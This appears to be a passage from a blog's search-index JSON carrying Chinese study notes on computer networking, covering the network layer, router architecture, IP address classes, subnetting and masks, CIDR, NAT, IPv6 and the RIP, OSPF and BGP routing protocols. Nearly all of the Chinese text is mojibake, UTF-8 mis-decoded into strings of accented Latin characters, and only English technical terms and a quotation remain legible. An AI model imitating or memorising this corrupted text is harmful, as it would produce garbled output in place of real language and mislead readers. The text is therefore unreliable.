è®¡ç®—æœºç½‘ç»œä¸­çš„ä»»ä½•è®¾å¤‡éƒ½éœ€è¦å®ç°é“¾è·¯å±‚ é“¾è·¯å±‚ ä¸¤ç±»ä¿¡é“ ä¸¤ä¸ªå­å±‚ åŸºæœ¬æ¦‚å¿µ æ•°æ®é“¾è·¯æ§åˆ¶ï¼ˆDLCï¼‰ æµé‡æ§åˆ¶å’Œå·®é”™æ§åˆ¶ ä¸‰ä¸ªåŸºæœ¬é—®é¢˜","tags":["è®¡ç®—æœºç½‘ç»œ","é“¾è·¯å±‚"],"title":"é“¾è·¯å±‚"},{"categories":["principle","è®¡ç®—æœºç½‘ç»œ"],"contents":" It isn\u0026rsquo;t where you come from, it\u0026rsquo;s where you\u0026rsquo;re going that counts. â€” Ella Fitzgerald\né“¾è·¯å±‚å¹²çš„äº‹æƒ…æ˜¯å±€éƒ¨çš„ï¼Œç½‘ç»œå±‚å¹²çš„äº‹æƒ…æ˜¯å…¨å±€çš„\nç½‘ç»œå±‚ æ¦‚è¿° ç½‘ç»œå±‚æä¾›çš„æœåŠ¡ è·¯ç”±å’Œè½¬å‘ ç½‘ç»œå±‚æä¾›çš„ä¸¤ç§åˆ†ç»„äº¤æ¢çš„æ–¹æ³• æ•°æ®æŠ¥æ–¹æ³•ï¼šæ— è¿æ¥æœåŠ¡ï¼ˆç°åœ¨ä½¿ç”¨çš„ï¼‰ è™šç”µè·¯æ–¹æ³•ï¼šé¢å‘è¿æ¥æœåŠ¡ ä¸¤ç§æ–¹æ³•ç›¸æ¯”è¾ƒ è·¯ç”±å™¨æ¶æ„ æ€»ä½“æ¶æ„ è¾“å…¥ äº¤æ¢ è¾“å‡º è°ƒåº¦ç­–ç•¥ åŸºäºä¼˜å…ˆçº§ IP åè®® (ç½‘é™…åè®®) IP åœ°å€ IPåœ°å€å’ŒMACåœ°å€ ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨ç¡¬ä»¶åœ°å€è¿›è¡Œé€šä¿¡ï¼Ÿ ç¼–å€æ–¹æ³• åˆ†ç±» IP åœ°å€ ç‚¹åˆ†åè¿›åˆ¶è®°æ³• å¸¸è§çš„ä¸‰ç±» IP åœ°å€ï¼ˆAã€Bã€Cï¼‰ åˆ†ç±»IPåœ°å€çš„ç‰¹ç‚¹ åˆ†ç±»IPçš„ç¼ºç‚¹ åˆ’åˆ†å­ç½‘ åˆ’åˆ†å­ç½‘çš„ä¼˜ç¼ºç‚¹ å­ç½‘æ©ç â€”â€”æ‰¾å‡ºIPåœ°å€ä¸­çš„å­ç½‘å· å›ºå®šé•¿åº¦å­ç½‘å’Œå˜é•¿å­ç½‘ è¶…ç½‘ï¼ˆæ— åˆ†ç±»ç¼–å€ï¼‰CIDR â€“ Classless Inter-Domain Routing CIDRåœ°å€å— è·¯ç”±èšåˆ (route aggregation)/æ„æˆè¶…ç½‘ (supernetting) CIDRçš„ç®€å†™ CIDRçš„ç‰¹ç‚¹ åœ°å€èšåˆ IPæ•°æ®æŠ¥ é¦–éƒ¨ å¯å˜éƒ¨åˆ† NAT-Network Address Translation ç½‘ç»œåœ°å€è½¬æ¢ æœ¬åœ°åœ°å€å’Œå…¨çƒåœ°å€ ä¸“ç”¨äºæœ¬åœ°åœ°å€çš„åœ°å€å— NATè½¬æ¢çš„å…·ä½“å†…å®¹ çº¯NATçš„è®¡ç®—æ–¹æ³• çº¯NATçš„å±€é™ NAPTçš„è®¡ç®—æ–¹æ³• NAPTçš„ç¼ºç‚¹ IPv6 IPv6çš„ç‰¹ç‚¹ IPv6çš„é¦–éƒ¨ IPv6çš„åœ°å€ å†’å·åå…­è¿›åˆ¶è®°æ³• ç®€å†™ ç‰¹æ®Šè®°æ³• åˆ†ç±» å‘IPv6è¿‡æ¸¡ åŒåè®®æ ˆ éš§é“æŠ€æœ¯ è·¯ç”±åè®®/ç®—æ³• ç†æƒ³çš„è·¯ç”±ç®—æ³• åˆ†å±‚æ¬¡çš„è·¯ç”±é€‰æ‹©åè®® ä½¿ç”¨åŸå›  ä¸¤ç±»è·¯ç”±é€‰æ‹©åè®® ã€å†…éƒ¨ç½‘å…³åè®®ã€‘è·¯ç”±ä¿¡æ¯åè®® RIPåè®® RIPçš„ç‰¹ç‚¹ è·¯ç”±è¡¨çš„å»ºç«‹ RIP2åè®®æŠ¥æ–‡æ ¼å¼ RIPåè®®çš„ä¼˜ç¼ºç‚¹ ã€å†…éƒ¨ç½‘å…³åè®®ã€‘å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆ OSPF (Open Shortest Path First)åè®® ä¸‰ä¸ªè¦ç‚¹ é“¾è·¯çŠ¶æ€æ•°æ®åº“ (link-state database) OSPFçš„åŒºåŸŸ OSPFçš„ç‰¹ç‚¹ OSPFåˆ†ç»„æ ¼å¼ æŒ‡å®šçš„è·¯ç”±å™¨ ä¸RIPçš„å¯¹æ¯” ã€å¤–éƒ¨ç½‘å…³åè®®ã€‘BGPåè®® BGPå‘è¨€äºº BGPäº¤æ¢è·¯ç”±ä¿¡æ¯ BGPå‘è¨€äººäº¤æ¢è·¯å¾„å‘é‡ BGPåè®®çš„ç‰¹ç‚¹ BGPåè®®çš„å››ç§æŠ¥æ–‡ BGPåè®®æŠ¥æ–‡æ ¼å¼ ä¸¤ç±»åŸºæœ¬è·¯ç”±ç®—æ³• ç½‘ç»œçš„å›¾çš„æŠ½è±¡ é“¾è·¯æˆæœ¬ è·¯ç”±ç®—æ³•çš„åˆ†ç±» é“¾è·¯çŠ¶æ€ç®—æ³• è·ç¦»å‘é‡ç®—æ³• æ¦‚è¿° ç½‘ç»œå±‚ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯ä¼ è¾“æ•°æ®æ®µï¼ˆsegmentï¼‰\nå‘é€ç«¯ æ¥æ”¶ç«¯ å°†ä¼ è¾“å±‚ç»™çš„æ•°æ®æ®µåŒ…è£…æˆæ•°æ®æŠ¥ è§£åŒ…æ•°æ®åŒ…ç»™ä¼ è¾“å±‚ æ¯ä¸ªç«¯ã€ä¸»æœºã€è·¯ç”±éƒ½è¦éƒ¨ç½²ç½‘ç»œå±‚ï¼Œä½†æ˜¯ä¸æ˜¯æ‰€æœ‰çš„ç½‘ç»œè®¾å¤‡éƒ½éœ€è¦éƒ¨ç½²ç½‘ç»œå±‚ï¼ˆå¦‚äº¤æ¢æœºä¸éœ€è¦ï¼‰\nè·¯ç”±æ£€æŸ¥ IP åœ°å€ï¼Œå¹¶é€‰æ‹©è·¯å¾„åˆ†ç»„è½¬å‘\nç½‘ç»œå±‚æä¾›çš„æœåŠ¡ åˆ†ç»„ï¼šæŠŠæ•°æ®åˆ†ç»„æ‰“åŒ…å¹¶åœ¨ç»ˆç‚¹è§£åŒ… è·¯ç”±ï¼šæ•°æ®è¦ç»è¿‡è·¯ç”±çš„ä¸­è½¬æ‰èƒ½åˆ°è¾¾ç›®çš„åœ° ä¸€ä¸ªç‰©ç†ç½‘ç»œæ˜¯ç½‘ç»œå’Œè¿æ¥å®ƒä»¬çš„è·¯ç”±çš„æ€»å’Œ è½¬å‘ï¼šåˆ†ç»„åˆ°è¾¾è·¯ç”±å™¨çš„ä¸€ä¸ªç«¯å£æ—¶ï¼Œè·¯ç”±å™¨æ‰€é‡‡å–çš„è¡Œä¸ºã€‚è·¯ç”±å™¨çš„å†³ç­–ä¾æ®è½¬å‘è¡¨ï¼ˆè·¯ç”±è¡¨ï¼‰ è·¯ç”±å’Œè½¬å‘ æ•°æ®å¹³é¢ æ§åˆ¶å¹³é¢ æœ¬åœ°ã€åŸºäºå•ä¸ªè·¯ç”±å™¨çš„è¡Œä¸º Network-wide çš„è¡Œä¸º ä¸»è¦è¡Œä¸ºï¼šè½¬å‘ ä¸»è¦è¡Œä¸ºï¼šè·¯ç”± ç½‘ç»œå±‚æä¾›çš„ä¸¤ç§åˆ†ç»„äº¤æ¢çš„æ–¹æ³• æ•°æ®æŠ¥æ–¹æ³•ï¼šæ— è¿æ¥æœåŠ¡ï¼ˆç°åœ¨ä½¿ç”¨çš„ï¼‰ ç½‘ç»œå±‚åªè´Ÿè´£å°†æ•°æ®æŠ¥ä»æºç«¯å‘é€åˆ°ç›®çš„ç«¯ï¼Œå‘ä¸Šåªæä¾›ç®€å•çµæ´»çš„ã€æ— è¿æ¥çš„ã€å°½æœ€å¤§åŠªåŠ›äº¤ä»˜çš„æ•°æ®æŠ¥æœåŠ¡ï¼Œä¸ä¿è¯è´¨é‡ï¼Œæ™ºèƒ½çš„äº‹æƒ…æ‘†åœ¨ä¸»æœºä¸Šåšã€‚\nä½¿ç”¨æ— è¿æ¥æœåŠ¡æ—¶ï¼Œæ¯ä¸€ä¸ªæ­£åœ¨ä¼ é€çš„åˆ†ç»„éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å®ä½“ï¼ŒåŒå±äºä¸€ä¸ªæŠ¥æ–‡çš„è¯¸åˆ†ç»„æ— è”ç³»ï¼Œæ¯ä¸€ä¸ªåˆ†ç»„çš„è·¯ç”±éƒ½åŸºäºå®ƒçš„å¤´éƒ¨ä¿¡æ¯ï¼ˆæºåœ°å€å’Œç›®çš„åœ°å€ï¼‰\nä¼˜ç‚¹ï¼š\nç½‘ç»œçš„é€ ä»·å¤§å¤§é™ä½ è¿è¡Œæ–¹å¼çµæ´» èƒ½å¤Ÿé€‚åº”å¤šç§åº”ç”¨ ï¼ˆä¾¿å®œçµæ´»ç”¨é€”å¹¿ï¼‰\nè™šç”µè·¯æ–¹æ³•ï¼šé¢å‘è¿æ¥æœåŠ¡ å€Ÿé‰´äºç”µä¿¡ç½‘çš„æˆåŠŸç»éªŒï¼Œè®©ç½‘ç»œè´Ÿè´£å¯é äº¤ä»˜ï¼Œé€šä¿¡ä¹‹å‰å…ˆå»ºç«‹è™šç”µè·¯ (Virtual Circuit)ï¼Œä»¥ä¿è¯åŒæ–¹é€šä¿¡æ‰€éœ€çš„ä¸€åˆ‡ç½‘ç»œèµ„æº\nè™šç”µè·¯è¡¨ç¤ºè¿™åªæ˜¯ä¸€æ¡é€»è¾‘ä¸Šçš„è¿æ¥ï¼Œåˆ†ç»„éƒ½æ²¿ç€è¿™æ¡é€»è¾‘è¿æ¥æŒ‰ç…§å­˜å‚¨è½¬å‘æ–¹å¼ä¼ é€ï¼Œè€Œå¹¶ä¸æ˜¯çœŸæ­£å»ºç«‹äº†ä¸€æ¡ç‰©ç†è¿æ¥ã€‚ è¯·æ³¨æ„ï¼Œç”µè·¯äº¤æ¢çš„ç”µè¯é€šä¿¡æ˜¯å…ˆå»ºç«‹äº†ä¸€æ¡çœŸæ­£çš„è¿æ¥ æ¯ä¸ªåˆ†ç»„éƒ½åŸºäºåˆ†ç»„çš„æ ‡ç­¾ï¼ˆè™šç”µè·¯æ ‡è¯†ç¬¦ï¼‰è¢«è½¬å‘ï¼ˆè¿™è®©æºåœ°å€å’Œç›®çš„åœ°å€å¥½åƒå˜å¾—æ— ç”¨ï¼‰\nä¸¤ç§æ–¹æ³•ç›¸æ¯”è¾ƒ è·¯ç”±å™¨æ¶æ„ ç½‘ç»œå±‚ä½¿ç”¨çš„è·¯ç”±å™¨ç§°ä¸ºç½‘å…³\næ€»ä½“æ¶æ„ è¾“å…¥ è‹¥äº¤æ¢ç»“æ„è½¬å‘åˆ†ç»„çš„é€Ÿåº¦æ¯”æ‰€æœ‰è¾“å…¥ç«¯å£åˆ†ç»„åˆ°è¾¾çš„é€Ÿåº¦å’Œè¦æ…¢ï¼Œåˆ™ä¼šåœ¨è¾“å…¥ç«¯å£çš„ç¼“å­˜ä¸­å‘ç”Ÿæ’é˜Ÿ è‹¥ç¼“å­˜æº¢å‡ºï¼Œåˆ™ä¼šäº§ç”Ÿæ’é˜Ÿå»¶æ—¶æˆ–åˆ†ç»„ä¸¢å¤± HOL é˜»å¡ï¼ˆHead-of-the-lineï¼‰ï¼šæ’åœ¨é˜Ÿåˆ—å‰é¢çš„æ•°æ®æŠ¥å¯èƒ½ä¼šé˜»ç¢é˜Ÿåˆ—ä¸­å…¶ä»–çš„æ•°æ®æŠ¥çš„è½¬å‘ äº¤æ¢ è´Ÿè´£å°†åˆ†ç»„ä»è¾“å…¥ç«¯å£çš„ç¼“å­˜å‘é€åˆ°åˆé€‚çš„è¾“å‡ºç«¯å£ç¼“å­˜\näº¤æ¢é€Ÿç‡ï¼šä»æ‰€æœ‰è¾“å…¥ç«¯å£åˆ°æ‰€æœ‰è¾“å‡ºç«¯å£è½¬å‘åˆ†ç»„çš„é€Ÿç‡\nçºµæ¨ªå¼äº¤æ¢æœºï¼šæ¯ä¸€ä¸ªäº¤å‰ç‚¹éƒ½ä½¿ç”¨å¾®äº¤æ¢æœº\næ¦•æ ‘äº¤æ¢æœºï¼šå¤šçº§äº¤æ¢æœºï¼Œæ¯ä¸€çº§éƒ½æœ‰ä¸€ä¸ªå¾®å¼€å…³\nè¾“å‡º äº§ç”Ÿçš„é—®é¢˜ï¼š\nè‹¥å‘å‡ºåˆ†ç»„çš„é€Ÿåº¦æ¯”äº¤æ¢ç»“æ„çš„é€Ÿåº¦æ…¢ï¼Œåˆ™åˆ†ç»„ä¼šåœ¨è¾“å‡ºç«¯å£çš„ç¼“å­˜ä¸­æ’é˜Ÿã€‚ è‹¥ç¼“å­˜å¤§å°ä¸è¶³ï¼Œåˆ™åˆ†ç»„å¯èƒ½å› ä¸ºå‘ç”Ÿæ‹¥å¡è€Œä¸¢å¤± éœ€è¦ä½¿ç”¨è°ƒåº¦ç®—æ³•æ¥é€‰æ‹©ä¼ è¾“å“ªäº›æ’é˜Ÿçš„åˆ†ç»„\nè°ƒåº¦ç­–ç•¥ åŸºäºä¼˜å…ˆçº§ é«˜ä¼˜å…ˆçº§çš„æ’é˜Ÿåˆ†ç»„æœ€å…ˆå‘é€\nåˆ†ç±»çš„æ ‡å‡†å¯èƒ½æ˜¯ç‰¹æ®Šæ ‡è®°ã€æˆ–å…¶ä»–é¦–éƒ¨ä¿¡æ¯ã€‚ä¾‹å¦‚ IP æºåœ°å€ã€IP ç›®çš„åœ°å€ã€ç«¯å£å·ç­‰\nå…¶ä»–è¿˜æœ‰è½®è¯¢è°ƒåº¦ç­–ç•¥ç­‰\nIP åè®® (ç½‘é™…åè®®) ä¸ IP åè®®é…å¥—ä½¿ç”¨çš„è¿˜æœ‰ä¸‰ä¸ªåè®®ï¼š\nåœ°å€è§£æåè®® ARP (Address Resolution Protocol) ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®® ICMP (Internet Control Message Protocol) ç½‘é™…ç»„ç®¡ç†åè®® IGMP (Internet Group Management Protocol) åˆ©ç”¨ IP åè®®å°±å¯ä»¥ä½¿è¿™äº›æ€§èƒ½å„å¼‚çš„ç½‘ç»œåœ¨ç½‘ç»œå±‚ä¸Šçœ‹èµ·æ¥å¥½åƒæ˜¯ä¸€ä¸ªç»Ÿä¸€çš„ç½‘ç»œã€‚è¿™ç§ä½¿ç”¨ IP åè®®çš„è™šæ‹Ÿäº’è¿ç½‘ç»œå¯ç®€ç§°ä¸º IP ç½‘ï¼ˆIP ç½‘æ˜¯è™šæ‹Ÿçš„ï¼Œä½†å¹³å¸¸ä¸å¿…æ¯æ¬¡éƒ½å¼ºè°ƒâ€œè™šæ‹Ÿâ€äºŒå­—ï¼‰ã€‚\nIP åœ°å€ IP åœ°å€å°±æ˜¯ç»™æ¯ä¸ªè¿æ¥åœ¨äº’è”ç½‘ä¸Šçš„ä¸»æœºï¼ˆæˆ–è·¯ç”±å™¨ï¼‰åˆ†é…ä¸€ä¸ªåœ¨å…¨ä¸–ç•ŒèŒƒå›´æ˜¯å”¯ä¸€çš„ 32 ä½çš„æ ‡è¯†ç¬¦ï¼ˆä¸€èˆ¬ç”¨å½¢å¦‚ X.X.X.X çš„æ–¹å¼è¡¨ç¤ºï¼Œæ¯ä¸ª X å¯¹åº” 8 ä½çš„äºŒè¿›åˆ¶æ•°ï¼‰\nIPåœ°å€å’ŒMACåœ°å€ ç¡¬ä»¶åœ°å€ï¼ˆæˆ–ç‰©ç†åœ°å€ï¼‰æ˜¯æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚ä½¿ç”¨çš„åœ°å€ã€‚ IP åœ°å€æ˜¯ç½‘ç»œå±‚å’Œä»¥ä¸Šå„å±‚ä½¿ç”¨çš„åœ°å€ï¼Œæ˜¯ä¸€ç§é€»è¾‘åœ°å€ï¼ˆç§° IP åœ°å€æ˜¯é€»è¾‘åœ°å€æ˜¯å› ä¸º IP åœ°å€æ˜¯ç”¨è½¯ä»¶å®ç°çš„ï¼‰ã€‚ IP å±‚æŠ½è±¡çš„äº’è”ç½‘å´å±è”½äº†ä¸‹å±‚è¿™äº›å¾ˆå¤æ‚çš„ç»†èŠ‚ã€‚åªè¦æˆ‘ä»¬åœ¨ç½‘ç»œå±‚ä¸Šè®¨è®ºé—®é¢˜ï¼Œå°±èƒ½å¤Ÿä½¿ç”¨ç»Ÿä¸€çš„ã€æŠ½è±¡çš„ IP åœ°å€ç ”ç©¶ä¸»æœºå’Œä¸»æœºæˆ–è·¯ç”±å™¨ä¹‹é—´çš„é€šä¿¡\nåœ¨é“¾è·¯å±‚æ˜¯çœ‹ä¸åˆ°IPåœ°å€çš„ï¼Œåªèƒ½çœ‹åˆ°å¸§ï¼Œç„¶åæŠŠå–å‡ºæ¥çš„IPæ•°æ®æŠ¥æŠ›ç»™ç½‘ç»œå±‚å»åˆ†æï¼Œè®©ç½‘ç»œå±‚ä¸å¿…å…³å¿ƒé“¾è·¯ä¸Šä¼ æ’­çš„ç»†èŠ‚ã€‚\nä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨ç¡¬ä»¶åœ°å€è¿›è¡Œé€šä¿¡ï¼Ÿ ï¼ˆè¿‡å»ï¼‰éš¾ä»¥ç»Ÿä¸€æ ‡å‡†ï¼šå…¨ä¸–ç•Œå­˜åœ¨ç€å„å¼å„æ ·çš„ç½‘ç»œï¼Œå®ƒä»¬ä½¿ç”¨ä¸åŒçš„ç¡¬ä»¶åœ°å€ æ–¹ä¾¿å¿«æ·ï¼šè¿æ¥åˆ°äº’è”ç½‘çš„ä¸»æœºåªéœ€å„è‡ªæ‹¥æœ‰ä¸€ä¸ªå”¯ä¸€çš„ IP åœ°å€ï¼Œå®ƒä»¬ä¹‹é—´çš„é€šä¿¡å°±åƒè¿æ¥åœ¨åŒä¸€ä¸ªç½‘ç»œä¸Šé‚£æ ·ç®€å•æ–¹ä¾¿ ç¼–å€æ–¹æ³• åˆ†ç±»çš„ IP åœ°å€ -\u0026gt; å­ç½‘çš„åˆ’åˆ†ï¼ˆsubnettingï¼‰-\u0026gt; æ„æˆè¶…ç½‘ï¼ˆCIDRï¼‰ï¼ˆç°åœ¨ä½¿ç”¨ï¼‰\nåˆ†ç±» IP åœ°å€ IP åœ°å€åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå›ºå®šç±»ï¼Œæ¯ä¸€ç±»åœ°å€éƒ½ç”±ä¸¤ä¸ªå›ºå®šé•¿åº¦çš„å­—æ®µç»„æˆï¼š\nç½‘ç»œå· net-idï¼šå®ƒæ ‡å¿—ä¸»æœºï¼ˆæˆ–è·¯ç”±å™¨ï¼‰æ‰€è¿æ¥åˆ°çš„ç½‘ç»œ ä¸»æœºå· host-idï¼šå®ƒæ ‡å¿—è¯¥ä¸»æœºï¼ˆæˆ–è·¯ç”±å™¨ï¼‰ ç½‘ç»œå·åœ¨æ•´ä¸ªäº’è”ç½‘å†…æ˜¯å”¯ä¸€çš„ï¼Œä¸»æœºå·åœ¨å½“å‰ç½‘ç»œä¸‹åˆæ˜¯å”¯ä¸€çš„ï¼Œå› æ­¤ IP åœ°å€å°±å”¯ä¸€äº†\nç”±äºè¿‘å¹´æ¥å·²ç»å¹¿æ³›ä½¿ç”¨æ— åˆ†ç±» IP åœ°å€è¿›è¡Œè·¯ç”±é€‰æ‹©ï¼ŒA ç±»ã€B ç±»å’Œ C ç±»åœ°å€çš„åŒºåˆ†å·²æˆä¸ºå†å²\nç‚¹åˆ†åè¿›åˆ¶è®°æ³• IP åœ°å€æœ‰ 32 ä½ï¼Œæˆ‘ä»¬æŠŠæ¯å…«ä½åˆ†ä¸ºä¸€ä¸ªç»„ï¼Œæ¯ä¸€ä¸ªç»„è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°ï¼Œæ¯ä¸ªæ•°ä¹‹é—´ç”¨ç‚¹å·éš”å¼€ï¼Œå°±æˆäº† IP åœ°å€\nå¸¸è§çš„ä¸‰ç±» IP åœ°å€ï¼ˆAã€Bã€Cï¼‰ Açš„ç¬¬ä¸€ä½å·²ç»å›ºå®šä¸º0ï¼ŒBçš„ä¸€äºŒä½ä¸º10ï¼ŒCçš„å‰ä¸‰ä½ä¸º110\nç”±ä¸Šå›¾å¯çŸ¥ï¼Œå½“IPåœ°å€çš„ç¬¬ä¸€ä½åœ¨1 ~ 126ä¹‹é—´ä¸ºAç±»åœ°å€ï¼Œ128 ~ 191ä¹‹é—´ä¸ºBç±»ï¼Œ192 ~ 223ä¸ºCç±»åœ°å€\nå…¶ä¸­127å¼€å¤´çš„ä¸ºç‰¹æ®Šåœ°å€\nè¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„IPåœ°å€ï¼š\nåˆ†ç±»IPåœ°å€çš„ç‰¹ç‚¹ IP åœ°å€æ˜¯ä¸€ç§åˆ†ç­‰çº§çš„åœ°å€ç»“æ„ IP åœ°å€ç®¡ç†æœºæ„åœ¨åˆ†é… IP åœ°å€æ—¶åªåˆ†é…ç½‘ç»œå·ï¼Œè€Œå‰©ä¸‹çš„ä¸»æœºå·åˆ™ç”±å¾—åˆ°è¯¥ç½‘ç»œå·çš„å•ä½è‡ªè¡Œåˆ†é…ï¼ˆåˆ†å°åˆ¶ï¼‰â€”â€”æ–¹ä¾¿ç®¡ç† è·¯ç”±å™¨ä»…æ ¹æ®ç›®çš„ä¸»æœºæ‰€è¿æ¥çš„ç½‘ç»œå·æ¥è½¬å‘åˆ†ç»„ â€”â€”å‡å°‘å ç”¨ç©ºé—´ å®é™…ä¸Š IP åœ°å€æ˜¯æ ‡å¿—ä¸€ä¸ªä¸»æœºï¼ˆæˆ–è·¯ç”±å™¨ï¼‰å’Œä¸€æ¡é“¾è·¯çš„æ¥å£ å½“ä¸€ä¸ªä¸»æœºåŒæ—¶è¿æ¥åˆ°ä¸¤ä¸ªç½‘ç»œä¸Šæ—¶ï¼Œè¯¥ä¸»æœºå°±å¿…é¡»åŒæ—¶å…·æœ‰ä¸¤ä¸ªç›¸åº”çš„ IP åœ°å€ï¼Œå…¶ç½‘ç»œå· net-id å¿…é¡»æ˜¯ä¸åŒçš„ã€‚è¿™ç§ä¸»æœºç§°ä¸ºå¤šå½’å±ä¸»æœº (multihomed host)ã€‚ ç”±äºä¸€ä¸ªè·¯ç”±å™¨è‡³å°‘åº”å½“è¿æ¥åˆ°ä¸¤ä¸ªç½‘ç»œï¼ˆè¿™æ ·å®ƒæ‰èƒ½å°† IP æ•°æ®æŠ¥ä»ä¸€ä¸ªç½‘ç»œè½¬å‘åˆ°å¦ä¸€ä¸ªç½‘ç»œï¼‰ï¼Œå› æ­¤ä¸€ä¸ªè·¯ç”±å™¨è‡³å°‘åº”å½“æœ‰ä¸¤ä¸ªä¸åŒçš„ IP åœ°å€ ç”¨è½¬å‘å™¨æˆ–ç½‘æ¡¥è¿æ¥èµ·æ¥çš„è‹¥å¹²ä¸ªå±€åŸŸç½‘ä»ä¸ºä¸€ä¸ªç½‘ç»œï¼Œå› æ­¤è¿™äº›å±€åŸŸç½‘éƒ½å…·æœ‰åŒæ ·çš„ç½‘ç»œå· net-id æ‰€æœ‰åˆ†é…åˆ°ç½‘ç»œå· net-id çš„ç½‘ç»œï¼Œæ— è®ºæ˜¯èŒƒå›´å¾ˆå°çš„å±€åŸŸç½‘ï¼Œè¿˜æ˜¯å¯èƒ½è¦†ç›–å¾ˆå¤§åœ°ç†èŒƒå›´çš„å¹¿åŸŸç½‘ï¼Œéƒ½æ˜¯å¹³ç­‰çš„ åˆ†ç±»IPçš„ç¼ºç‚¹ IP åœ°å€ç©ºé—´çš„åˆ©ç”¨ç‡æœ‰æ—¶å¾ˆä½ï¼ˆç²’åº¦å¤ªç²—ï¼‰ ç»™æ¯ä¸€ä¸ªç‰©ç†ç½‘ç»œåˆ†é…ä¸€ä¸ªç½‘ç»œå·ä¼šä½¿è·¯ç”±è¡¨å˜å¾—å¤ªå¤§å› è€Œä½¿ç½‘ç»œæ€§èƒ½å˜å·® ä¸¤çº§çš„ IP åœ°å€ä¸å¤Ÿçµæ´» åˆ’åˆ†å­ç½‘ å°†åŸæœ¬çš„ä¸¤çº§IPåœ°å€çš„åˆ†çº§åˆ¶åº¦æ‰©å±•ä¸ºä¸‰çº§çš„IPåœ°å€\nåŸæœ¬ï¼šç½‘ç»œå·+ä¸»æœºå· -\u0026gt; åˆ’åˆ†å­ç½‘ï¼šç½‘ç»œå·+å­ç½‘å·+ä¸»æœºå·\nåŸºæœ¬æ€è·¯ï¼š\nåˆ’åˆ†ç§æœ‰åŒ–ï¼šåˆ’åˆ†å­ç½‘çº¯å±ä¸€ä¸ªå•ä½å†…éƒ¨çš„äº‹æƒ…ã€‚å•ä½å¯¹å¤–ä»ç„¶è¡¨ç°ä¸ºæ²¡æœ‰åˆ’åˆ†å­ç½‘çš„ç½‘ç»œã€‚ åŸæœ¬ä½æ•°ä¸å˜ï¼šä»ä¸»æœºå·å€Ÿç”¨è‹¥å¹²ä¸ªä½ä½œä¸ºå­ç½‘å· subnet-idï¼Œè€Œä¸»æœºå· host-id ä¹Ÿå°±ç›¸åº”å‡å°‘äº†è‹¥å¹²ä¸ªä½ å‘é€æ–¹æ³•ä¸å˜ï¼šå‡¡æ˜¯ä»å…¶ä»–ç½‘ç»œå‘é€ç»™æœ¬å•ä½æŸä¸ªä¸»æœºçš„ IP æ•°æ®æŠ¥ï¼Œä»ç„¶æ˜¯æ ¹æ® IP æ•°æ®æŠ¥çš„ç›®çš„ç½‘ç»œå· net-idï¼Œå…ˆæ‰¾åˆ°è¿æ¥åœ¨æœ¬å•ä½ç½‘ç»œä¸Šçš„è·¯ç”±å™¨ã€‚ç„¶åæ­¤è·¯ç”±å™¨åœ¨æ”¶åˆ° IP æ•°æ®æŠ¥åï¼Œå†æŒ‰ç›®çš„ç½‘ç»œå· net-id å’Œå­ç½‘å· subnet-id æ‰¾åˆ°ç›®çš„å­ç½‘ã€‚æœ€åå°±å°† IP æ•°æ®æŠ¥ç›´æ¥äº¤ä»˜ç›®çš„ä¸»æœºã€‚ è™½ç„¶æ ¹æ®å·²æˆä¸ºäº’è”ç½‘æ ‡å‡†åè®®çš„ RFC 950 æ–‡æ¡£ï¼Œå­ç½‘å·ä¸èƒ½ä¸ºå…¨ 1 æˆ–å…¨ 0ï¼Œä½†éšç€æ— åˆ†ç±»åŸŸé—´è·¯ç”±é€‰æ‹© CIDR çš„å¹¿æ³›ä½¿ç”¨ï¼Œç°åœ¨å…¨ 1 å’Œå…¨ 0 çš„å­ç½‘å·ä¹Ÿå¯ä»¥ä½¿ç”¨äº†ï¼Œä½†ä¸€å®šè¦è°¨æ…ä½¿ç”¨ï¼Œç¡®è®¤ä½ çš„è·¯ç”±å™¨æ‰€ç”¨çš„è·¯ç”±é€‰æ‹©è½¯ä»¶æ˜¯å¦æ”¯æŒå…¨ 0 æˆ–å…¨ 1 çš„å­ç½‘å·è¿™ç§è¾ƒæ–°çš„ç”¨æ³•\nåˆ’åˆ†å­ç½‘çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š\nå‡å°‘äº† IP åœ°å€çš„æµªè´¹ ä½¿ç½‘ç»œçš„ç»„ç»‡æ›´åŠ çµæ´» æ›´ä¾¿äºç»´æŠ¤å’Œç®¡ç† ç¼ºç‚¹ï¼š å‡å°‘äº†èƒ½å¤Ÿè¿æ¥åœ¨ç½‘ç»œä¸Šçš„ä¸»æœºæ€»æ•°\nå­ç½‘æ©ç â€”â€”æ‰¾å‡ºIPåœ°å€ä¸­çš„å­ç½‘å· å•å•å‡­å€ŸIPåœ°å€æ˜¯æ— æ³•åˆ¤æ–­è¯¥åœ°å€æ˜¯å¦è¿›è¡Œäº†å­ç½‘åˆ’åˆ†çš„ï¼Œå› æ­¤éœ€è¦ä¸€ä¸ªæ©ç ï¼ˆmaskï¼‰æ¥æŠŠæ— ç”¨çš„ä¿¡æ¯â€œæ¡£æ‰â€ï¼Œç•™ä¸‹æœ‰ç”¨çš„å­ç½‘å·\næŠŠIPåœ°å€ä¸æ©ç è¿›è¡Œé€ä½çš„ä¸è¿ç®—ï¼Œå°±å¯ä»¥æŠŠä¸»æœºå·å±è”½ï¼Œç•™ä¸‹ç½‘ç»œå·+å­ç½‘å·\nAã€Bã€Cç±»IPåœ°å€çš„é»˜è®¤å­ç½‘æ©ç ï¼š\nå› æ­¤ï¼Œå„åœ°æ–¹å°±å¯ä»¥ä½¿ç”¨ä¸åŒçš„å­ç½‘æ©ç ï¼Œä»è€Œå°†å­ç½‘å·ä»ä¸»æœºå·ä¸­åŒºåˆ†å‡ºæ¥\nå› æ­¤ï¼Œå¯¹äºè·¯ç”±å™¨ï¼š\nå’Œç›¸é‚»è·¯ç”±å™¨äº¤æ¢è·¯ç”±ä¿¡æ¯æ—¶ï¼Œå¿…é¡»æŠŠè‡ªå·±æ‰€åœ¨ç½‘ç»œï¼ˆæˆ–å­ç½‘ï¼‰çš„å­ç½‘æ©ç å‘Šè¯‰ç›¸é‚»è·¯ç”±å™¨ 